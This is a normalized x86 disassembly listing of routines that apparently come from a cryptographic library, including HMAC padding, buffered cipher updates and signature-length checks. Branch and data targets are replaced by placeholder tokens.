call sub_1001d740
add esp 0xc
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
sub_1002b000
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
xor ecx ecx
mov eax 0x1
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
pop esi
retn
push eax
call sub_10022640
add esp 0x4
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
push esi
call eax
add esp 0x4
test [ esi + 0x8 ] 0x4
jne r-xdata
push eax
push ecx
call sub_10026870
mov eax [ esi + 0xc ]
push eax
call sub_1001d740
add esp 0xc
sub_1002b0b0
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
xor edi edi
xor ebp ebp
mov [ esp + 0x18 ] edi
mov [ esp + 0x14 ] edi
xor ebx ebx
call sub_1002dc50
mov esi [ esp + 0x34 ]
cmp eax edi
mov [ esp + 0x10 ] eax
je r-xdata
push 0xa8
push r--data
push 0x3
push 0x67
push 0x5
call sub_1001de60
mov ebp [ esp + 0x2c ]
add esp 0x14
mov edi [ esi + 0x18 ]
test edi edi
jne r-xdata
test edi edi
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov ebx [ esi + 0x14 ]
test ebx ebx
jne r-xdata
call sub_100299b0
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_1002dcb0
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
push ebx
call sub_10029950
add esp 0x4
test [ esi + 0x1c ] 0x1
je r-xdata
call sub_100299b0
mov ebx eax
test ebx ebx
je r-xdata
mov [ esp + 0x14 ] 0x1
push edi
call sub_10029950
add esp 0x4
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
lea edx [ esi + 0x20 ]
push 0x1a
push edx
call sub_1004c5e0
mov ebp eax
add esp 0x10
test ebp ebp
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov eax edi
lea ecx [ esp + 0x1c ]
push ecx
call sub_10029990
mov edx [ edi ]
mov ecx [ edi + 0x4 ]
mov [ esp + 0x20 ] edx
mov edx [ edi + 0x8 ]
mov [ esp + 0x24 ] ecx
mov ecx [ edi + 0xc ]
mov [ esp + 0x28 ] edx
mov edx [ edi + 0x10 ]
mov [ esp + 0x2c ] ecx
mov ecx [ esp + 0x30 ]
and edx 0xfffffffe
and ecx 0x1
or edx ecx
add esp 0x4
or edx 0x6
lea eax [ esp + 0x1c ]
mov [ esp + 0x2c ] edx
jmp r-xdata
push 0x0
push 0x0
push eax
push edi
call sub_100492a0
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_10029870
add esp 0x4
dec eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] edi
mov ebp 0x1
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ebp
mov edx [ esi + 0x44 ]
push ecx
mov ecx [ esi + 0x8 ]
push ecx
push eax
mov eax [ esi + 0xc ]
push eax
push ebx
push esi
call [ edx + 0xc ]
add esp 0x1c
test eax eax
je r-xdata
test ebx ebx
je r-xdata
sub_1002b240
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
or ebp 0xffffffff
mov eax [ esi + 0x8 ]
xor ebx ebx
push eax
mov [ esp + 0x14 ] ebp
call sub_10029870
add esp 0x4
cmp eax 0x2710
jle r-xdata
call sub_1002dc50
mov edi eax
test edi edi
je r-xdata
push 0xba
push r--data
push 0x67
push 0x66
push 0x5
call sub_1001de60
add esp 0x14
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x18 ]
add esp 0x8
test eax eax
jne r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
push 0xc5
push r--data
push 0x64
jmp r-xdata
mov ebp [ esp + 0x20 ]
lea eax [ esp + 0x24 ]
push eax
push ebp
push esi
call sub_1004c750
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
push edi
push ecx
lea edx [ esi + 0x20 ]
push 0x1a
push edx
call sub_1004c5e0
mov ebx eax
mov al [ esi + 0x1c ]
add esp 0x10
test al 0x2
jne r-xdata
push 0x66
push 0x5
call sub_1001de60
add esp 0x14
push 0xd8
push r--data
push 0x66
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x18 ]
or [ eax + 0x10 ] 0x4
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x44 ]
push ebx
mov ebx [ esp + 0x18 ]
push edi
push edx
push eax
push ebp
push ebx
push esi
call [ ecx + 0xc ]
add esp 0x1c
test eax eax
jne r-xdata
push edi
call sub_1002de00
push edi
call sub_1002dcb0
mov eax [ esp + 0x18 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ esp + 0x1c ]
push ecx
push ebx
call sub_10029ef0
add esp 0x8
mov [ esp + 0x10 ] eax
jmp r-xdata
push 0xde
push r--data
push 0x3
jmp r-xdata
sub_1002b390
mov eax [ esp + 0xc ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
push edx
push eax
mov eax [ esp + 0x1c ]
push eax
call sub_1004cbe0
add esp 0x18
retn
mov ecx [ esp + 0x4 ]
test [ ecx + 0x1c ] 0x2
je r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x1c ]
push ecx
mov ecx [ esp + 0x18 ]
mov eax [ edx ]
mov edx [ esp + 0x1c ]
push edx
mov edx [ esp + 0x18 ]
push ecx
push edx
push eax
mov eax [ esp + 0x1c ]
push eax
call sub_1004d520
add esp 0x18
retn
sub_1002b430
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
call sub_10029530
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
neg eax
sbb eax eax
and eax 0x2
retn
mov eax 0x1
retn
push esi
mov esi [ esp + 0xc ]
mov edx [ esi ]
push edx
call sub_100296b0
add esp 0x4
mov [ esi ] 0x0
mov eax 0x2
pop esi
retn
sub_1002b500
push ebx
push ebp
mov ebp [ esp + 0x10 ]
xor eax eax
push esi
push edi
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebx [ esp + 0x14 ]
push ebx
call sub_10021330
mov edi eax
add esp 0x4
cmp edi 0x10
jbe r-xdata
lea esi [ ebx + 0x10 ]
push edi
push esi
push ebp
call sub_10043650
add esp 0xc
cmp eax edi
je r-xdata
push r--data
push 0x62
push r--data
call sub_1001f8d0
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov ecx edi
lea edi [ ebx + 0x20 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_1002b533
add esp 0xc
lea esi [ ebx + 0x10 ]
push edi
push esi
push ebp
call sub_10043650
add esp 0xc
cmp eax edi
je r-xdata
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx edi
lea edi [ ebx + 0x20 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_1002b570
push ebx
mov ebx [ esp + 0xc ]
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
push esi
push edi
mov edi [ esp + 0x10 ]
push edi
call sub_10021330
mov esi eax
add esp 0x4
cmp esi 0x10
jbe r-xdata
add edi 0x10
push esi
push edi
push ebx
call sub_10043600
add esp 0xc
pop edi
pop esi
push r--data
push 0x74
push r--data
call sub_1001f8d0
sub_1002b620
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x1
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_1001d7e0
add esp 0x18
retn
sub_1002b650
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x0
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_1001d7e0
add esp 0x18
retn
sub_1002b680
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
test ebp ebp
push edi
jg r-xdata
mov ebx [ esp + 0x14 ]
mov edi [ ebx + 0xc ]
test edi edi
jne r-xdata
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ eax ] 0x0
xor eax eax
test ebp ebp
pop ebp
pop ebx
sete al
retn
mov eax [ ebx ]
mov esi [ eax + 0x4 ]
cmp esi 0x20
mov [ esp + 0x14 ] esi
jle r-xdata
test [ ebx + 0x68 ] ebp
jne r-xdata
test edi edi
je r-xdata
push r--data
push 0xa7
push r--data
call sub_1001f8d0
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
mov ecx [ ebx ]
push ebp
push edx
push eax
push ebx
call [ ecx + 0x18 ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov edi [ esp + 0x18 ]
mov [ eax ] 0x0
lea ecx [ edi + ebp ]
cmp ecx esi
jge r-xdata
mov edx [ esp + 0x1c ]
pop edi
pop esi
pop ebp
mov [ edx ] 0x0
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x1c ]
pop edi
pop esi
mov eax 0x1
mov [ ecx ] ebp
pop ebp
pop ebx
retn
test esi esi
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ ebx ]
push ebp
push edx
push edi
push ebx
call [ ecx + 0x18 ]
add esp 0x10
test eax eax
jne r-xdata
mov ebp esi
mov esi [ esp + 0x20 ]
sub ebp edi
lea edi [ edi + ebx + 0x30 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov eax [ ebx ]
lea ecx [ ebx + 0x30 ]
push esi
push ecx
push edi
push ebx
call [ eax + 0x18 ]
add esp 0x10
test eax eax
jne r-xdata
mov esi [ esp + 0x20 ]
mov ecx ebp
mov edx ecx
lea edi [ edi + ebx + 0x30 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0xc ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0xc ] eax
mov eax [ esp + 0x14 ]
pop ebp
pop ebx
mov [ eax ] 0x0
mov eax 0x1
retn
mov [ ebx + 0xc ] esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esp + 0x20 ]
mov ecx esi
mov edx ecx
lea edi [ ebx + 0x30 ]
lea esi [ eax + ebp ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x24 ]
mov eax [ esp + 0x1c ]
add [ eax ] ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
sub edx ebp
add ecx ebp
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x1c ]
mov ebp [ esp + 0x24 ]
add edi esi
mov [ edx ] esi
mov esi [ esp + 0x14 ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
dec esi
and esi ebp
sub ebp esi
mov [ esp + 0x24 ] esi
test ebp ebp
jle r-xdata
sub_1002b820
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
test esi esi
push edi
jg r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ ebx + 0x5c ]
test ah 0x1
je r-xdata
mov eax [ esp + 0x1c ]
pop edi
mov [ eax ] 0x0
xor eax eax
test esi esi
pop esi
pop ebp
sete al
pop ebx
retn
mov ecx [ ebx ]
mov ebp [ ecx + 0x4 ]
cmp ebp 0x20
jbe r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push esi
push ecx
push edx
push eax
push ebx
call sub_1002b680
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
push r--data
push 0x107
push r--data
call sub_1001f8d0
mov [ esp + 0x14 ] 0x0
mov eax [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
lea esi [ ebx + 0x6c ]
mov edi eax
mov [ esp + 0x14 ] 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov esi [ esp + 0x24 ]
mov [ esp + 0x18 ] eax
jmp r-xdata
cmp ebp 0x1
jbe r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
push esi
mov esi [ esp + 0x20 ]
push eax
push esi
push ecx
push ebx
call sub_1002b680
add esp 0x14
test eax eax
jne r-xdata
mov [ ebx + 0x64 ] 0x0
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
add [ esi ] ebp
mov ecx [ esi ]
mov eax [ esp + 0x18 ]
sub ecx ebp
lea edi [ ebx + 0x6c ]
mov [ esi ] ecx
mov ecx ebp
mov [ ebx + 0x64 ] 0x1
mov esi [ esi ]
mov edx ecx
add esi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
sub_1002b940
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
mov esi [ esp + 0x10 ]
mov [ ebx ] 0x0
push edi
mov eax [ esi ]
mov edi [ eax + 0x4 ]
mov eax [ esi + 0x5c ]
test ah 0x1
je r-xdata
cmp edi 0x1
jbe r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
mov [ ebx ] 0x0
pop ebp
mov eax 0x1
pop ebx
retn
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push 0x139
push r--data
push 0x8a
push 0x65
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x143
push r--data
push 0x6d
push 0x65
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
cmp edi 0x20
jbe r-xdata
xor eax eax
mov al [ edi + esi + 0x6b ]
test eax eax
je r-xdata
push r--data
push 0x146
push r--data
call sub_1001f8d0
push 0x14a
jmp r-xdata
cmp eax edi
jg r-xdata
push r--data
push 0x64
push 0x65
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
xor ebp ebp
test eax eax
jle r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
sub ecx eax
xor eax eax
test ecx ecx
jle r-xdata
lea ecx [ edi + esi + 0x6c ]
pop edi
pop esi
mov [ ebx ] ecx
pop ebp
mov eax 0x1
pop ebx
retn
mov edi [ esp + 0x18 ]
push 0x151
inc ebp
cmp ebp eax
jl r-xdata
mov dl [ esi + eax + 0x6c ]
mov [ eax + edi ] dl
inc eax
cmp eax ecx
jl r-xdata
dec ecx
xor edx edx
mov dl [ ecx ]
cmp edx eax
jne r-xdata
sub_1002ba70
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x10 ]
test dl 0x80
je r-xdata
mov ecx [ esp + 0x8 ]
push esi
mov esi [ eax + 0x58 ]
cmp esi ecx
pop esi
jne r-xdata
mov edx [ esp + 0x8 ]
push 0x0
push edx
push 0x1
push eax
call sub_1001dbc0
add esp 0x10
retn
test ecx ecx
jle r-xdata
mov eax 0x1
retn
push 0x172
push r--data
push 0x82
push 0x7a
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
retn
test dl 0x8
je r-xdata
mov [ eax + 0x58 ] ecx
mov eax 0x1
retn
sub_1002bae0
mov eax 0x80
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x9c ]
xor eax eax
push edi
test esi esi
je r-xdata
mov ebx [ esp + 0x94 ]
mov ecx [ ebx ]
mov [ esp + 0xa0 ] ecx
mov esi ecx
mov ebx [ esp + 0x94 ]
mov eax 0x1
mov [ ebx ] esi
jmp r-xdata
test eax eax
je r-xdata
push esi
call sub_1002b5f0
mov edi eax
add esp 0x4
cmp edi 0x80
jle r-xdata
mov ecx [ esp + 0x98 ]
test ecx ecx
je r-xdata
lea eax [ ebx + 0x14 ]
add ebx 0x4
push eax
push ebx
call sub_1002ac20
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x80
retn
jmp r-xdata
mov ebp [ esp + 0x9c ]
cmp edi ebp
jge r-xdata
push r--data
push 0x54
push r--data
call sub_1001f8d0
xor eax eax
test ebp ebp
jl r-xdata
mov edx [ esp + 0xa4 ]
lea edi [ ebx + 0x4 ]
push edx
push esi
push edi
call sub_1002aa50
mov eax [ esp + 0xa4 ]
push ebp
push eax
push edi
call sub_1002ab80
lea esi [ ebx + 0x34 ]
lea ecx [ ebx + 0x38 ]
push esi
push ecx
push edi
call sub_1002aba0
add esp 0x24
jmp r-xdata
mov cl [ ebx + eax + 0x38 ]
xor cl 0x36
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x80
jl r-xdata
mov ebp [ esp + 0xa4 ]
lea edi [ ebx + 0x14 ]
push ebp
push esi
push edi
call sub_1002aa50
push esi
call sub_1002b5f0
lea edx [ esp + 0x20 ]
push eax
push edx
push edi
call sub_1002ab80
add esp 0x1c
xor eax eax
push r--data
push 0x5e
push r--data
call sub_1001f8d0
cmp ebp 0x80
jle r-xdata
mov esi [ esi ]
cmp esi 0x80
je r-xdata
mov cl [ ebx + eax + 0x38 ]
xor cl 0x5c
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x80
jl r-xdata
lea edi [ ebx + 0x24 ]
push ebp
push esi
push edi
call sub_1002aa50
push esi
call sub_1002b5f0
lea edx [ esp + 0x20 ]
push eax
push edx
push edi
call sub_1002ab80
add esp 0x1c
mov esi [ esp + 0x98 ]
mov ecx ebp
mov edx ecx
lea edi [ ebx + 0x38 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea esi [ ebx + 0x34 ]
mov [ esi ] ebp
mov esi [ esp + 0xa0 ]
mov ecx 0x80
xor eax eax
sub ecx esi
lea edi [ esi + ebx + 0x38 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_1002bcc0
mov eax 0x40
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x4c ]
mov eax [ edi ]
push eax
call sub_1002b5f0
lea ecx [ esp + 0x50 ]
lea edx [ esp + 0xc ]
lea esi [ edi + 0x4 ]
push ecx
push edx
push esi
call sub_1002aba0
add edi 0x24
push edi
push esi
call sub_1002ac20
mov eax [ esp + 0x64 ]
lea ecx [ esp + 0x20 ]
push eax
push ecx
push esi
call sub_1002ab80
mov edx [ esp + 0x78 ]
mov eax [ esp + 0x74 ]
push edx
push eax
push esi
call sub_1002aba0
add esp 0x30
pop edi
pop esi
add esp 0x40
retn
sub_1002bd20
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x14 ]
push eax
call sub_1002aa30
lea ecx [ esi + 0x24 ]
push ecx
call sub_1002aa30
add esi 0x4
push esi
call sub_1002aa30
add esp 0xc
pop esi
retn
sub_1002bd50
push edi
mov edi [ esp + 0x8 ]
lea eax [ edi + 0x14 ]
push eax
call sub_1002b000
lea ecx [ edi + 0x24 ]
push ecx
call sub_1002b000
lea edx [ edi + 0x4 ]
push edx
call sub_1002b000
mov ecx 0x2e
xor eax eax
add esp 0xc
[ edi ]
pop edi
retn
sub_1002bd80
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push esi
lea eax [ edi + 0x14 ]
push eax
call sub_1002b610
lea ecx [ edi + 0x24 ]
push esi
push ecx
call sub_1002b610
add edi 0x4
push esi
push edi
call sub_1002b610
add esp 0x18
pop edi
pop esi
retn
sub_1002bdb0
mov eax 0x58
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x70 ]
push edi
mov edi [ esp + 0x68 ]
xor edx edx
mov ebx [ edi ]
lea ecx [ ebx + 0x2c ]
push 0x55
push r--data
push 0x6e
push 0x6c
push 0x6
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebx
add esp 0x58
retn
cmp [ esi ] eax
je r-xdata
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
inc edx
add ecx 0x4
cmp edx 0x4
jl r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_1002aa30
lea ecx [ esp + 0x18 ]
push edi
push ecx
call sub_1002ac20
mov eax [ edi ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ch 0x8
je r-xdata
push 0x5a
push r--data
push 0x69
push 0x6c
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x58
retn
mov eax [ ecx ]
test eax eax
je r-xdata
lea edx [ esp + 0x68 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call sub_1002aba0
mov edx [ esi + 0xc ]
mov ecx [ esp + 0x7c ]
mov eax [ edi ]
push edx
mov edx [ esp + 0x7c ]
push ecx
mov ecx [ esp + 0x7c ]
push edx
push ecx
mov ecx [ eax ]
lea edx [ esp + 0x40 ]
push edx
push ecx
call [ eax + 0x28 ]
add esp 0x24
mov ecx [ esi + 0xc ]
lea edx [ esp + 0x14 ]
mov [ esp + 0xc ] edx
lea edx [ esp + 0xc ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x70 ]
push edx
mov edx [ esp + 0x70 ]
push ecx
mov ecx [ eax ]
push edx
push 0xffffffff
push 0x0
push ecx
call [ eax + 0x28 ]
add esp 0x18
jmp r-xdata
lea edx [ esp + 0x14 ]
mov esi eax
push edx
call sub_1002b000
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x58
retn
sub_1002bed0
mov eax 0x2c
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x54 ]
xor ebx ebx
xor ebp ebp
mov [ esp + 0x10 ] 0x1
test [ edi + 0x3c ] 0x40
je r-xdata
mov eax [ esp + 0x40 ]
cmp eax 0x72
jne r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x2c ]
cmp eax ebx
je r-xdata
lea edx [ esp + 0x24 ]
push eax
mov [ esp + 0x18 ] edx
call sub_10022900
mov ecx [ esp + 0x18 ]
add esp 0x4
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x48 ]
mov esi 0x24
cmp eax esi
je r-xdata
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
push edi
push ecx
mov ecx [ esp + 0x50 ]
push edx
mov edx [ esp + 0x50 ]
push ecx
mov ecx [ esp + 0x50 ]
push edx
push ecx
call eax
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
cmp [ eax + 0xc ] ebx
jne r-xdata
push 0x69
push r--data
push 0x75
push 0x75
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov ebx [ esp + 0x44 ]
jmp r-xdata
push 0x57
push r--data
push 0x83
push 0x75
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
lea edx [ esp + 0x1c ]
mov [ esp + 0x1c ] 0x5
mov [ esp + 0x20 ] ebx
lea eax [ esp + 0x2c ]
mov [ ecx + 0x4 ] edx
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x48 ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x14 ]
push ebx
push eax
mov [ esp + 0x3c ] ecx
mov [ esp + 0x34 ] edx
call sub_1004d8e0
add esp 0x8
mov esi eax
push 0x6e
push r--data
push 0x74
push 0x75
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
push edi
call sub_10024800
lea ecx [ eax - 0xb ]
add esp 0x4
cmp esi ecx
mov [ esp + 0x44 ] eax
jle r-xdata
cmp [ esp + 0x40 ] 0x72
je r-xdata
push 0x7e
push r--data
push 0x70
push 0x75
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov ecx [ esp + 0x4c ]
push 0x1
push edi
push ecx
push ebx
push esi
call sub_100247a0
add esp 0x14
test eax eax
jg r-xdata
push 0x82
inc eax
push r--data
push eax
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
mov edx [ esp + 0x50 ]
mov esi [ esp + 0x10 ]
mov [ edx ] eax
xor esi esi
jmp r-xdata
lea edx [ esp + 0x54 ]
lea eax [ esp + 0x14 ]
push edx
push eax
mov [ esp + 0x5c ] ebp
call sub_1004d8e0
add esp 0x8
mov ebx ebp
push 0x85
push r--data
push 0x41
push 0x75
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x44 ]
inc eax
push eax
push ebp
call sub_10026870
push ebp
call sub_1001d740
add esp 0xc
cmp [ esp + 0x40 ] 0x72
je r-xdata
sub_1002c0e0
mov eax 0x4
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x24 ]
mov [ esp + 0x8 ] 0x0
push esi
call sub_10024800
mov ebx [ esp + 0x24 ]
add esp 0x4
cmp ebx eax
je r-xdata
test [ esi + 0x3c ] 0x40
je r-xdata
push 0xa2
push r--data
push 0x77
push 0x77
push 0x4
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebx
pop ecx
retn
push ebp
push 0xac
push r--data
push ebx
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
push edi
mov edi [ esp + 0x18 ]
cmp edi 0x72
jne r-xdata
push 0xaf
push r--data
push 0x41
push 0x77
push 0x4
call sub_1001de60
mov eax [ esp + 0x20 ]
add esp 0x14
pop ebp
pop esi
pop ebx
pop ecx
retn
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push esi
push ebx
push ecx
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push ecx
push edx
call eax
add esp 0x18
pop esi
pop ebx
pop ecx
retn
mov eax [ esp + 0x24 ]
push 0x1
push esi
push ebp
push eax
push ebx
call sub_100247d0
mov esi eax
add esp 0x14
test esi esi
jle r-xdata
cmp [ esp + 0x20 ] 0x24
je r-xdata
mov eax [ esp + 0x28 ]
push eax
push ebp
call sub_10026870
push ebp
call sub_1001d740
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop ebp
pop esi
pop ebx
pop ecx
retn
cmp edi 0x72
jne r-xdata
push 0xb6
push r--data
push 0x83
push 0x77
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
lea eax [ esp + 0x18 ]
push esi
push eax
push 0x0
mov [ esp + 0x24 ] ebp
call sub_1004d8c0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
cmp esi 0x24
jne r-xdata
mov eax [ esp + 0x18 ]
add esi ebp
cmp eax esi
je r-xdata
push 0xc9
push r--data
push 0x68
push 0x77
push 0x4
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edi [ esp + 0x1c ]
mov ecx 0x9
mov esi ebp
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov ecx [ ebx ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
push 0xd4
jmp r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
mov edx [ ebx ]
mov eax [ edx ]
push eax
call sub_10022ae0
add esp 0x4
cmp eax edi
je r-xdata
push eax
call sub_1004d920
add esp 0x4
cmp eax 0x5
je r-xdata
push r--data
push 0x68
mov eax [ ebx + 0x4 ]
mov ecx [ esp + 0x20 ]
cmp [ eax ] ecx
jne r-xdata
cmp edi 0x4
jne r-xdata
push 0xdd
jmp r-xdata
push 0xff
